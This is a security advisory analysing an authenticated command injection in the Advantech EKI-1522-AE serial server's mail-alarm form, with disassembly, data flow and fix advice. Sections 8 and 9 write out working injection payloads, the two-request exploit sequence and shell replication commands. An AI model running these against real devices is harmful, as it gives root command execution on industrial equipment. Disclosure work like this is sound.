# Advantech EKI-1522-AE D1.99_r3510 - Mail-Alarm Command Injection in the Web Management Plane

## 1. Overview

### Overview of the finding

The EKI-1522-AE is a serial device server: an appliance whose job is to carry raw RS-232, RS-422 and
RS-485 traffic between attached industrial equipment and an IP network. It is administered through a
small web interface, and one of the features of that interface is an alarm-notification form that lets an
administrator have the device send mail when a configured condition occurs. The form takes an SMTP server
address, a sender address and one or more recipient addresses.

Those four values are stored in the device's configuration file and later interpolated into a shell command
line, `mail -s '<subject> (date) <name>' -S <mailserver> -H <ip> -f <from_mail> <to_mail>`, which is
executed through `system()`. The subject is quoted. The SMTP server, the sender and the recipient list are
not. The command-line string is built by `sprintf` from a fixed format and passed to a `system()` wrapper
whose disassembly is unambiguously `execve("/bin/sh", ["sh", "-c", command])`, so the shell parses the whole
line a second time and interprets any metacharacter in those three positions as syntax. A value of the shape
`1.1.1.1$(id>/tmp/marker)` therefore executes `id` on the device, in the context of the daemon that fires
the notification, which the init script starts as root.

The finding is authenticated: reaching the form requires an administrator session on the web UI. It is not
an authentication bypass, it is not a memory-corruption defect, and it is not a default-credential finding
even though this product ships a factory-default administrator password - that default is disclosed
separately as CWE-798 and is not the vector used here. The vector is the injection itself, which survives a
password change and which any administrator can reach.

### Overview of the product and the two binaries

The analyzed image is EKI-1522-AE firmware D1.99_r3510. The platform is a Winbond W90N740: an ARM7TDMI
core implementing ARMv4T, with no MMU, no address-space layout randomization, no non-executable stack, no
stack canary and no position-independent code. The operating system is uClinux 2.4.31, the MMU-less Linux
variant that was standard on this class of hardware. Everything in user space is compiled as BFLT flat
binaries, the format uClinux uses when there is no MMU and therefore no demand paging.

Two binaries matter here, and they matter for different reasons:

- `/cgi-bin/index.cgi` is the CGI program the web interface dispatches its forms to, a BFLT flat binary of
  299,384 bytes with sha256 `e7cc5df6bf84710b2ee9c9a124416de2b3fc7e4707a740eb37921d8ba90078e8`. Each
  configuration action is selected by the `func` parameter of a POST to that path, and each page is a branch
  inside that one binary. It contains a mail-command construction at `fcn.0001d30c` with five live call
  sites, so the code is reachable and is not a leftover of a disabled feature.
- `edgserver` is the device daemon, a BFLT flat binary of 468,884 bytes with sha256
  `a52ce55e3b0feb5f25432b035452b2957759c806b33554ec4d8d4bee2f5147f4`. The init script `/etc/rc` starts it
  in the background as root, and it owns the event, alarm and notification machinery. It contains the same
  mail-command construction at `fcn.000397cc`, and that copy is the one that matters for exploitation,
  because it is reached at boot from the persisted configuration rather than from a request.

Analysing these binaries required working around the BFLT format's mixed endianness: the literal pools are
stored big-endian while the ARM code is little-endian, which defeats decompilers that assume one convention.
The record's approach was to search the raw file for literal-pool values, read the relocated addresses from
the disassembly comments of `pd`, and work from a linear disassembly dump. This is context for the reader
who wants to reproduce the offsets below, not a property of the vulnerability.

### Overview of the verification boundary

The dynamic portion of this research is a sink-level replication, and the boundary is stated here at the top
so that no later section can be read as a live-device result. The shell command line, the argument
positions and the `system()` semantics were reproduced natively as `/bin/sh -c` on an isolated
cloud-hosted sandbox. That reproduces the shell's parsing of the constructed command line without depending
on the target's instruction set, which is legitimate because `system()` is defined as a `fork` plus
`execve("/bin/sh", ["sh", "-c", command])` and nothing about that interpretation is architecture-specific.
All three unquoted fields were exercised, each run produced a marker containing
`uid=0(root) gid=0(root) groups=0(root)`, and a benign control value produced no marker.

What was not done: no physical EKI-1522-AE was driven, no HTTP request was fired at device hardware, and the
two-step boot-triggered flow was not observed end to end. Full-device emulation was not available - there is
no QEMU machine definition for the W90N740 platform, and converting these BFLT binaries to ELF is blocked by
the same mixed endianness that complicates the static analysis. The request path, the configuration store,
the boot-time re-read and the sink location are therefore established by instruction-level reconstruction of
both binaries, while the shell-level behaviour is established by the replication. Section 9 keeps the two
halves of the evidence separated.

### Overview of public-record independence

The record distinguishes this finding from the previously published command-injection identifiers in this
product family. Those identifiers cover different fields and different sinks: the NTP server-name field
reaching an `msntp -r %s &` construction, the device-name field reaching `hostname %s`, and an input
overflow in the NTP path. This finding is a mail-alarm field reaching a `mail -s ... -S %s ... -f %s %s`
construction in two different binaries. Different fields, different sink functions and different sink
binaries mean the two are independent defects, and the record states that the analyzed firmware version
never received a patch for the mail fields. No CVE identifier has been assigned to this finding, and this
advisory does not claim one. The record also notes that the publication of those earlier identifiers
concerned firmware generations at or below a different release line, so no fix for them is a fix for this.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Item | Value established by this research |
|---|---|
| Vendor | Advantech, industrial automation and embedded computing |
| Product | EKI-1522-AE, two-port serial device server |
| Version analyzed | firmware D1.99_r3510 |
| Platform | Winbond W90N740, ARM7TDMI (ARMv4T), no MMU, uClinux 2.4.31 |
| Web server | BoA 0.93 on port 80, HTTP Basic Auth, `Auth / /var/other1/passwd` |
| CGI program | `/cgi-bin/index.cgi`, 299,384 bytes, sha256 `e7cc5df6...78e8` |
| Daemon | `edgserver`, 468,884 bytes, sha256 `a52ce55e...47f4`, started as root from `/etc/rc` |
| Vulnerable form | `POST /cgi-bin/index.cgi` with `func=setalarm` |
| Parameters | `mailserver`, `from_mail`, `to_mail%d` |
| CGI sink function | `fcn.0001d30c` (format string `0x400a4`, five call sites) |
| Daemon sink function | `fcn.000397cc` (format string `0x65bc4`), fired at boot |
| Format string | `mail -s '%s (date) %s' -S %s -H %s -f %s %s` |
| Unquoted sinks | `-S` mailserver, `-f` from_mail, trailing recipient |
| Execution primitive | `system()` = `execve("/bin/sh", ["sh", "-c", command])` |
| Sanitization | none: 128-byte cap and URL decode only, no metacharacter screening |
| Trigger | second POST (`func=reboot` or `func=setpassword`) then device restart |
| Observed identity | `uid=0(root) gid=0(root) groups=0(root)` markers, sink-level replication |
| Session gate | administrator session on the web UI (Basic Auth) |
| Primary CWE | CWE-78 |
| Adjacent CWE | CWE-798 (factory-default credential, disclosed separately, not the vector) |
| Published score | 7.2 High, `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |
| Identifier | none assigned |

### Vulnerability Summary mechanics

The daemon-side construction, as recovered from `edgserver`, is short enough to state directly. The format
string is loaded from a literal, the mail configuration values are loaded from the structure that the
configuration import populated, and the assembled buffer is passed to the `system()` wrapper:

```
format @0x400a4: "mail -s '%s (date) %s' -S %s -H %s -f %s %s"

0x1d3e4  ldr r1, str.mail... @0x400a4
0x1d3e0  str ip, [var_20h]      ; ip = r4+0xc0        -> -f from_mail
0x1d3f8  str r4, [var_18h]      ; r4 = [r7,0x1c]      -> -S mailserver
0x1d3f0  str lr, [var_24h]      ; lr = r4+r5+0x100    -> recipient to_mail[r5]
0x1d404  sprintf(buf, fmt, ..., mailserver, ..., from_mail, to_mail)
0x1d410  ldr r3, [0x1d43c] = 0x280d8   ; system wrapper
0x1d41c  call system(buf)
```

That is the CGI copy. The daemon copy is the same shape with different addresses:

```
0x397e0  r7 = [0x6ed78]              ; global config struct pointer
0x39814  r0 = [r7, 0x1c]             ; struct base
0x398b8  var_18h = r4                -> -S mailserver
0x39898  ip = r4 + 0xc0              -> -f from_mail
0x39888  lr = r4 + r5 + 0x100        -> recipient to_mail[r5]
0x398a4  r1 = format @0x65bc4  "mail -s '%s (...) %s' -S %s -H %s -f %s %s"
0x398c8  sprintf(buf@fp-0x820, fmt, ..., mailserver, ..., from_mail, to_mail)
0x398d0  r3 = [0x398fc] = 0x4c548    ; system wrapper
0x398dc  mov pc, r3                  -> system(buf)
```

The reason this is command injection rather than argument injection is the quoting. Of the six `%s`
positions, two sit inside the single-quoted subject (`'%s (date) %s'`) and the other four are outside any
quoting: `-S`, `-H`, `-f` and the trailing recipient. One of those four - `-H` - receives the device's own
address from `inet_ntoa` rather than anything an operator supplies; the remaining three carry operator text.
`/bin/sh -c` does not see a mail client's argument list;
it sees a string, and it splits and interprets that string before `mail` is ever executed. A semicolon ends
the `mail` invocation and starts a new command; a newline does the same; a `$( )` is evaluated during word
expansion, before the `mail` process exists. None of those need to survive as characters in an argument,
because they never reach one.

### Vulnerability Summary preconditions

Four conditions have to hold, and all four are ordinary properties of a configured device:

- the web plane must be reachable from the attacker's position, which on this product means the
  administrator's HTTP service on port 80;
- the attacker must hold a valid administrator session, which is the only account the factory password file defines;
- the alarm form must be writable, which requires no special mode - it is part of the standard
  configuration interface;
- the device must restart, or the daemon must re-execute the notification path, for the payload to reach
  the shell. The exploit supplies that step itself through the documented warm-start action.

## 3. Authentication Boundary

### Authentication Boundary - what the gate is

The BoA web server is configured with a single authentication stanza whose document root is `/` and whose
password file is `/var/other1/passwd`, so Basic Auth covers every path including `/cgi-bin/index.cgi`. There
is no unauthenticated control plane on the web side and no anonymous action. The password file is populated
at boot: the init script copies `/home/passwd` to `/var/other1/passwd`. The factory image's `/home/passwd`
contains a single entry, a DES-crypt hash with the two-character salt `ad`, which resolves to the well-known
default pair for this product line. That default is a separate weakness - CWE-798 - and it is disclosed
separately. It is not the vector of this advisory.

The relevant consequence for scoring is that the account this chain needs is the administrator account and
nothing below it. The factory password file carries a single entry, and every action of the web interface,
including the alarm form, is available to whoever holds that one credential.

### Authentication Boundary - what the chain does not do

This finding does not bypass the login. It does not read the password file, does not attack the hash, does
not exploit the BoA version and does not require the factory default to be in place. An administrator who
has changed the password, and whose new password is strong, is exactly as exposed as one who has not,
because the injection consumes a legitimate session. Equally, the finding is not a privilege escalation
from a low-privileged account, since the firmware does not define one. It is a conversion: the authority to
edit settings becomes the authority to run commands, and the conversion is not authorized by anything the
vendor intended.

### Authentication Boundary - why that boundary does not soften the impact

It is worth being precise about what an administrator session means on an appliance of this class. The web
UI is not a tenant-scoped console; it is the only management interface the shipped firmware exposes, since
the telnet and FTP services in the image are disabled. Its holder is the party who already decides which
serial protocol the ports speak, which network the device sits on and which hosts may connect. Naming that
party "administrator" and then treating the resulting command execution as a lesser finding would
misdescribe the threat model: the credential is the vendor's entire access-control surface for the
device, and the finding shows that this credential - whatever its strength - is a shell.

The metric follows the same reasoning. CVSS asks which privileges an attacker must possess, not how easily
they are obtained. The chain requires the administrator, so Privileges Required is High; the factory default
is a separate defect reported on its own terms, and folding it into this score would double-count it.

## 4. Attack Surface

### Attack Surface - the web stack and its dispatch model

The entire administrative surface as shipped is a BoA server and the CGI program it dispatches to. The
server side of that surface is BoA alone; behind it, the CGI program dispatches on the `func` parameter of
the POST body and implements each configuration page as a branch inside one binary. That makes the surface
tractable to enumerate, and the research traced it branch by branch: the alarm branch is the one that
constructs a shell command from request data, and the remaining branches write configuration values or
render pages.

The alarm branch itself is narrow. It reads the mail server field, the sender field and a numbered series of
recipient fields, and it writes them through the configuration store. It is the only path in the CGI program
that feeds operator-supplied text into the mail construction.

### Attack Surface - why the surface audit narrowed here

Two properties made this branch worth the reconstruction effort. First, the values are stored, not used
immediately: the request writes them to `/var/other1/edg.conf`, and the daemon reads that file at boot. A
second-order path like this is where filtering is most often assumed to happen and least often verified, so
the audit traced the value from the request body to the `system()` call rather than stopping at the form.
Second, the mail construction exists twice - once in the CGI program and once in the daemon - and the
daemon's copy runs as root with no request context at all. A filter added at the web layer only would leave
the daemon path open to any other writer of the configuration file.

### Attack Surface - components that narrowed out

Several plausible-looking surfaces were examined and excluded, and the exclusions belong in the record:

- The telnet and FTP services are present in the firmware's inetd configuration but are commented out, so
  they are not part of the shipped attack surface.
- No authentication-bypass defect in the shipped BoA version was identified in this research; the login was
  treated as a real gate, and the finding is scoped accordingly.
- The `-H` argument of the mail construction receives the device's own address from `inet_ntoa`, not a
  request field, so it is not injectable even though it is also unquoted.
- The initial hypothesis that the construction might be a logging call rather than a command execution was
  tested and rejected: the callee's disassembly is a `system()` implementation, not a syslog wrapper.

## 5. Sink Identification

### Sink Identification - the three unquoted positions

The format string has six substitutions; four of them are outside quoting, and one of those four carries no
attacker data. Working from the left:

- `-S %s` carries the configured SMTP server. This is the field the working payload uses, because a mail
  server value is naturally an address and an address with a `$( )` suffix looks like a malformed but
  plausible value to a human reviewer of the configuration.
- `-f %s` carries the configured sender address and has exactly the same exposure.
- the trailing `%s` carries one recipient from the numbered `to_mail%d` series. Its exposure is the same, and
  the record's third replication vector exercises it with a newline separator, which is the form that works
  when a field is the last word on the line.
- `-H %s` is unquoted too, but receives `inet_ntoa` output for the device's own address and is therefore not
  attacker-controlled.

### Sink Identification - execution primitive

The wrapper is the part that turns the string into code. In `edgserver` it is `fcn.00054140`, reached through
the function pointer at `0x4c548`:

```
0x54234  r0 = "/bin/sh"
0x54238  r1 = "sh"
0x5423c  r2 = "-c"
0x54244  bl fcn.00055908   ; execve
0x5424c  bl fcn.00054a70   ; _exit
```

That is `system()`: `fork`, `execve("/bin/sh", ["sh", "-c", command])`, and `_exit(127)` in the child if the
exec fails. The CGI program has the same wrapper at `0x280d8`, resolving to `fcn.0002e0e4`, with the same
structure. The identification matters because it settles what parses the string. It is not the mail client
and it is not a custom tokenizer; it is the device's `/bin/sh`, and its word expansion is what the payload
has to satisfy.

### Sink Identification - the call sites prove this is not dead code

`fcn.0001d30c` has five call sites in the CGI program (`0x1d4c4`, `0x1d4f8`, `0x1d6c4`, `0x1d734`,
`0x1daf8`), so the construction is used in several places in the binary and is not a leftover. The
daemon-side `fcn.000397cc` is reached from the pass-change notification event, which is dispatched by the
callers at `0x5934`, `0x5950` and `0x25090` after the configuration import. Both copies are live code.

### Sink Identification - the string is never normalized after construction

No normalization step sits between `sprintf` and `system`. The buffer is assembled once and passed directly.
There is no escaping pass, no whitelist check on the assembled string and no argument-vector marshalling.
Whatever the configuration stored is what the shell receives, which is why the payload design in section 8
can be as simple as it is.

## 6. Source Identification

### Source Identification - the handler and its reader

The write path begins at the `func=setalarm` branch of the CGI program, at handler offset `0x520` within the
dispatcher. The three fields are pulled by name from the POST body:

```
0x544   ldr r1, str.mailserver   (0x3b674 = "mailserver")
0x598   ldr r1, str.from_mail    (0x3b694 = "from_mail")
0x5f0   ldr r1, str.to_mail%d    (0x3b6c0 = "to_mail%d")
        -> fcn.00000998  parameter reader: byte-wise copy, 128-byte cap, no metacharacter strip
        -> URL decode @0xb9c: '+' (0x2b) -> ' ' (0x20) at 0xb6c; '%' (0x25) -> 0xab0 %XX decode
        -> fcn.0000fcd4(config, key, value)   store
        -> fcn.0000f690                       commit -> /var/other1/edg.conf
```

The reader at `fcn.00000998` is a byte-wise copy with a length cap. It does not classify characters, does
not reject control bytes and does not escape anything. The URL decoder at `0xb9c` is a standard CGI decoder:
it maps `+` to space and decodes `%XX` pairs. Neither step removes a metacharacter, and the decoder makes
the payload easier to carry, because a `%24` in the body becomes a `$` in the stored value.

### Source Identification - why the value stays a string

A common way for an injection to die in embedded firmware is integer conversion: a field that is expected to
be an address gets passed through `atoi()` or `inet_addr()`, and the payload collapses to a number before it
reaches the command line. That does not happen here. The mail fields are treated as text - a hostname and
mail addresses - and the configuration store keeps them as strings. The record checked this explicitly and
concluded that the integer-conversion failure mode that affects other address-shaped fields in this code
base is structurally absent from the mail path.

### Source Identification - what the payload must respect

The constraints the payload has to satisfy are therefore only the transport's:

- 128 bytes per value, which the recorded payloads are far below;
- form encoding, so `$`, `(`, `)` and `;` must be percent-encoded in the body but arrive intact after
  decoding, while a newline has to be encoded as `%0a`;
- no filtering, so there is no character to avoid for defensive reasons.

## 7. Data Flow

### Data Flow - end to end

The chain has five stages and two requests. It is worth drawing, because the two-request shape is what makes
the finding easy to miss in a single-request review:

```
stage 1  POST /cgi-bin/index.cgi  func=setalarm  (authenticated)
         mailserver=<payload>  from_mail=...  to_mail0=...
           -> fcn.00000998 read -> 0xb9c URL decode -> fcn.0000fcd4 store
           -> fcn.0000f690 commit -> /var/other1/edg.conf   (raw string, no filtering)

stage 2  POST /cgi-bin/index.cgi  func=reboot   (authenticated)
           -> warm-start fcn.0001dbe0
                0x1dbf4  open /var/other1/warmstart "w"
                0x1dc28  system("killall edgserver")
           -> init restarts edgserver as root

stage 3  edgserver boot
           0x39910  open /var/other1/warmstart        (sentinel check)
           0x1fd7c  load /var/other1/edg.conf
           0x1fdb8  "mac%d%d" via fcn.0004f4cc
           0x1fe18  "pwd%d"
           fcn.0002d538  config get-by-key
           fcn.0002d744  store raw value into struct [0x6ed78,0x1c]
                        +0x0 mailserver | +0xc0 from_mail | +r6*64+0x100 to_mail[r6]

stage 4  pass-change notification event dispatched (callers 0x5934 / 0x5950 / 0x25090)
           -> sink fcn.000397cc

stage 5  sprintf(buf, "mail -s '...' -S <mailserver> -H <ip> -f <from_mail> <to_mail>")
         system(buf) -> execve("/bin/sh", ["sh", "-c", buf])
         /bin/sh interprets the unquoted fields -> command execution as root
```

### Data Flow - properties worth naming

Three properties of this flow shape both the exploit and the fix:

- It is configuration-mediated. The request does not execute anything by itself; it writes a file that a
  later process reads. This is why a request-only review sees a form that stores a string, and why the
  defect only appears when the daemon's boot path is reconstructed as well.
- It is persistent. The payload lives in `/var/other1/edg.conf` until something overwrites the field, so it
  survives the restart that triggers it and re-fires on subsequent notification events. The record's
  caveat that the trigger is not a single request cuts both ways: it costs the attacker a restart, and it
  costs the defender the assumption that the malicious value disappeared with the reboot.
- It crosses a privilege boundary that is not visible in the request. The CGI program and the daemon are
  different processes with different lifetimes; the CGI program's authority for this purpose is the file
  write, while the execution happens later, in the daemon, as root.

## 8. Exploit Construction

### Exploit Construction - request shape

Both requests are ordinary form posts to the one CGI path, carrying the Basic Auth header:

```
POST /cgi-bin/index.cgi HTTP/1.0
Host: <device>
Authorization: Basic <base64 of user:password>
Content-Type: application/x-www-form-urlencoded
Content-Length: <n>

func=setalarm&mailserver=<payload>&from_mail=a@b.c&to_mail0=x@y.z
```

followed by

```
func=reboot
```

The second request is what arms the trigger. The record notes that a password change (`func=setpassword`)
reaches the same warm-start path, because that handler sets the pass-change flag and writes the sentinel;
the reboot action is the simpler of the two and is what the PoC uses.

### Exploit Construction - payload engineering

The payload has to survive URL decoding and then be meaningful to `/bin/sh` in a position that is a word
inside a longer command line, not the whole line. Three shapes work, and the record exercises all three:

- `1.1.1.1$(id>/tmp/marker)` for the `-S` field: the command substitution is evaluated during word
  expansion, so the `mail` invocation is never even attempted with the original text, and no separator is
  needed. This is the cleanest form and the one the PoC uses.
- `a@b.c;id>/tmp/marker;` for the `-f` field: a semicolon ends the `mail` command and the trailing semicolon
  absorbs the rest of the line, so the malformed tail never runs.
- a newline between the address and the command for the recipient field: the recipient is the last word on
  the line, so a newline separator needs no terminator.

The percent-encoded forms are `%24%28id%3E%2Ftmp%2Fmarker%29`, `a%40b.c%3Bid%3E%2Ftmp%2Fmarker%3B` and
`x%40y.z%0aid%3E%2Ftmp%2Fmarker`. A `#` terminator also works in the first position and is what the record's
alternative payload uses, but it is not needed once the substitution form is chosen.

### Exploit Construction - what the PoC deliberately does not do

The published PoC writes exactly one file, the marker, by way of `id > <marker>`. It does not delete
anything, does not modify the device configuration beyond the mail fields it must set, does not add an
account, does not open a listener and does not exfiltrate data. It performs the two documented posts, waits
for the restart, and then reports the path of the marker so the operator can read it from the device
console. The retrieval step that the source record's script attempted - copying the marker into the web
root - is intentionally left out, because it writes a second file and because a marker readable from the
console is sufficient evidence.

The PoC also takes the target as an argument with a documentation-range default (`192.0.2.10`), which means
it is inert unless an operator points it at a device they are authorized to test. It contains no credential
beyond the product's documented factory default, which is passed as a default argument and can be
overridden, and it prints the expected marker content so an operator can compare.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

| Element | Value |
|---|---|
| Method | sink-level replication: the recorded `system()` command line replayed as native `/bin/sh -c` |
| Environment | isolated cloud-hosted sandbox, native x86-64, run deliberately as root |
| Replicated element | the argument construction `mail -s '<subject> (date) <name>' -S %s -H %s -f %s %s` with the three operator-controlled unquoted fields |
| Not performed | no live HTTP request against device hardware; no physical EKI-1522-AE driven; no W90N740 emulation |
| Observation channel | marker files written by the substituted command, read from the harness filesystem |
| Control | a benign SMTP server value with no metacharacters, through the identical command line |

### Dynamic Verification - the three vectors and the control

```
field -S   payload 1.1.1.1$(id>/tmp/marker_eki1522_S)      -> marker: uid=0(root) gid=0(root) groups=0(root)
field -f   payload a@b.c;id>/tmp/marker_eki1522_f;          -> marker: uid=0(root) gid=0(root) groups=0(root)
recipient  payload x@y.z + newline + id>/tmp/marker_eki1522_rcpt
                                                            -> marker: uid=0(root) gid=0(root) groups=0(root)
control    mailserver 192.168.1.1, no metacharacters        -> no marker (MISSING, correct)
```

The commands replay the record's, with the subject text reduced to a fixed string because the subject is not
part of the injection:

```
MAILSERVER='1.1.1.1$(id>/tmp/marker_eki1522_S)'
/bin/sh -c "mail -s 'alarm (date) subject' -S ${MAILSERVER} -H 127.0.0.1 -f a@b.c x@y.z" 2>/dev/null || true

FROM_MAIL='a@b.c;id>/tmp/marker_eki1522_f;'
/bin/sh -c "mail -s 'alarm (date) subject' -S 1.1.1.1 -H 127.0.0.1 -f ${FROM_MAIL} x@y.z" 2>/dev/null || true

TO_MAIL=$'x@y.z\nid>/tmp/marker_eki1522_rcpt'
/bin/sh -c "mail -s 'alarm (date) subject' -S 1.1.1.1 -H 127.0.0.1 -f a@b.c ${TO_MAIL}" 2>/dev/null || true

/bin/sh -c "mail -s 'alarm (date) subject' -S 192.168.1.1 -H 127.0.0.1 -f a@b.c x@y.z" 2>/dev/null || true
```

The control is the load-bearing negative: the same command line, the same mail client invocation, the same
harness and the same marker path, with a value that contains no metacharacters, produced no marker. Marker
creation is therefore attributable to the substituted text and not to the surrounding construction.

### Dynamic Verification - negatives, stated

- The two-step boot-triggered flow was not observed end to end on hardware. The warm-start sentinel write at
  `0x1dbf4`, the `killall edgserver` at `0x1dc28`, the sentinel check at `0x39910`, the configuration import
  at `0x1fd7c` and the notification dispatch are established by reconstruction, not by driving a device.
- The marker identity `uid=0(root) gid=0(root) groups=0(root)` is measured inside the replication harness,
  which was run as root by design. The mapping to the appliance rests on the init script's root start of
  `edgserver`, read from the firmware as a product artifact, and not on a live-device observation.
- The published client's HTTP path was exercised against a non-responsive address, where it timed out and
  exited cleanly; no device answered, so the request-side flow is not claimed as dynamically confirmed.
- No other field of the alarm form, no other `system()` site in either binary and no other form of the CGI
  program was dynamically exercised.
- No persistence across a factory reset or reflash, no escape from the appliance and no effect on the serial
  protocol stacks were tested or claimed.

## 10. Reachability and Security Impact

### Reachability - network position

The vulnerable plane is the device's HTTP management service, a TCP listener on port 80 that answers over
the routed network. The published vector is therefore `AV:N`, and its distance metric is the login, not the
network: a party holding an administrator session can complete both requests from anywhere the management
service is reachable. The device is administered over the network it serves, and this finding requires no
more than that - it does not depend on adjacency, and it does not depend on the management plane being
exposed beyond the network it is normally reached from.

The credential requirement defines the affected population precisely: every legitimate holder of the
administrator password - the commissioning engineer, the maintenance technician, a shared plant credential -
plus anyone who has obtained it by other means or who has not changed the factory default. For all of them,
the web console stops being a settings interface and becomes an unrestricted shell on the appliance.

### Reachability - impact in concrete terms

Command execution as the root daemon yields, at minimum:

- the complete configuration store and both password files, so every credential the device holds for its own
  operation, including the one that guards the web UI itself;
- control of the serial data path: the ports can be reconfigured, the mapping between serial frames and
  network connections can be altered, and traffic can be observed or disrupted at the appliance;
- control of the network behaviour of the device, including which hosts may connect and how the unit
  presents itself, which is enough to make the appliance a foothold on the plant segment rather than a
  passive bridge;
- persistence within the writable configuration store, re-triggered at every boot notification, and
  availability impact at will through the daemon and the restart mechanism the exploit already uses.

The escalation in trust terms is the point: the vendor's design treats the web password as the boundary
between "may configure" and "may not", and this finding shows that the boundary is actually between "may
not" and "may run anything as root".

## 11. Fix Recommendations

1. Remove the shell from the mail path. Build the mail client's argument vector and execute it with
   `execve()` - or with the process-spawn helper this firmware already contains - so that the SMTP server,
   sender and recipient are separate argument words that no shell parses. This is the only fix that closes
   the class rather than the instance.
2. If the shell must stay for one release cycle, single-quote every interpolated field with literal
   single-quote escaping and reject `;`, `|`, `&`, `$`, backtick, newline, carriage return, `<` and `>` at
   the handler. Add a post-construction assertion that the assembled command contains no `$` outside the
   quoted subject; fail the request if it does.
3. Validate by type. The SMTP server field is a hostname or an IPv4 literal and should be checked as one;
   the sender and recipient fields should be parsed against a strict address grammar. Address fields have no
   legitimate reason to carry shell metacharacters, so an allowlist is both simpler and stronger than a
   blocklist here.
4. Validate at both ends of the store. Add the same check to the daemon's configuration import at
   `fcn.0002d744`, so a configuration file written by any other means - an earlier firmware version, a
   restored backup, a different interface - cannot reach the shell either.
5. Drop the daemon's privilege. The notification path needs no root authority. Running `edgserver`, or at
   least a notification child, as an unprivileged account does not fix the injection but limits what any
   future defect in the same binary can do.
6. Restrict the configuration file. `/var/other1/edg.conf` is written by the web layer and read by a root
   daemon; its permissions and ownership should make it writable only by the components that legitimately
   own it, which raises the cost of the second-order path.
7. Add a handler-level regression test: submit an alarm form whose SMTP server field contains `$(true)`,
   whose sender contains a semicolon and whose recipient contains a newline, and assert that the request is
   rejected or that no child process is spawned. Run it against every model that shares this code base.
8. For operators, until a patch exists: change the factory-default credential, keep port 80 off untrusted
   segments, disable the mail alarm where it is not used, and treat unexpected changes to the mail fields in
   `/var/other1/edg.conf` as an arbitrary-code-execution indicator. Network restriction reduces exposure; it
   does not fix the defect, because any administrator session is still a command channel.
9. Vendor note: the record finds no patch for these fields in the firmware releases examined for this line,
   so a fix needs to be authored rather than backported, and the sibling port counts of the family should be
   reviewed against the same construction.

## 12. CWE

### CWE - classification rationale

- CWE-78, Improper Neutralization of Special Elements used in an OS Command, is the primary class and the
  only one needed to describe the mechanism. An operator-supplied value is interpolated into a command line
  built by `sprintf`, the line is handed to `system()`, and the resulting `/bin/sh -c` parses part of the
  value as command syntax. The unquoted `-S`, `-f` and recipient positions, the `system()` wrapper and the
  metacharacter breakout are all elements of that single class. The fact that the value is stored and read
  back before use makes this a second-order instance of the same class, which does not change the
  classification.
- CWE-798, Use of Hard-coded Credentials, is adjacent and is disclosed separately. The factory image carries
  a default administrator password, which lowers the practical cost of obtaining the session this finding
  requires, but it is a distinct defect with its own remediation (force a password change at first login)
  and it is not the vector. This advisory reports the injection; the default credential belongs to its own
  disclosure.
- CWE-88, Argument Injection, was considered and not applied as the primary class. The values do reach a
  command's argument positions, but the impact does not come from a value being read as an option: it comes
  from the shell parsing the assembled string and treating part of a value as a new command. That is CWE-78.
- CWE-20, Improper Input Validation, describes the absence of a control rather than the defect. The path has
  no validation at all - no blocklist, no allowlist, no escaping - so naming the missing validation would
  understate the finding: the defect is the construction, not the filter's character set.
- CWE-73 and CWE-15 were considered for the configuration-file-mediated shape and rejected: the attacker
  does not control a file path and does not control a configuration setting outside the intended form. The
  write goes through the documented handler into the documented store; only the later interpretation of the
  stored value is wrong.

---

Written by the 0day Rubbish Research Team.
